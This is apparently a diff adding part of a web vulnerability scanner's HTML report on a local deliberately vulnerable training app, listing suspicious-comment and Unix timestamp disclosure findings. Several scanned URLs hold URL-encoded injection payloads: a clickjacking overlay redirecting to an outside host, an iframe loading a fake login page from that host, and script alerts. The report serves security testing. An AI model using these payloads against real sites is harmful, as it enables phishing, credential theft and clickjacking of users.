+                <td width="20%">Solution</td><td width="80%"><p>Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>The following pattern was used: \bFROM\b and was detected in the element starting with: "&lt;script&gt;function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p></p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">200</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-info">
+                <th width="20%"><a name="info"></a>Informational (Low)</th><th width="80%">Timestamp Disclosure - Unix</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>A timestamp was disclosed by the application/web server - Unix</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path=dsvw.py</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?foobar</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">300000000</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>300000000, which evaluates to: 1979-07-05 07:20:00</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/w/page/13246936/Information%20Leakage</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">200</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">13</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+    </body>
+</html>
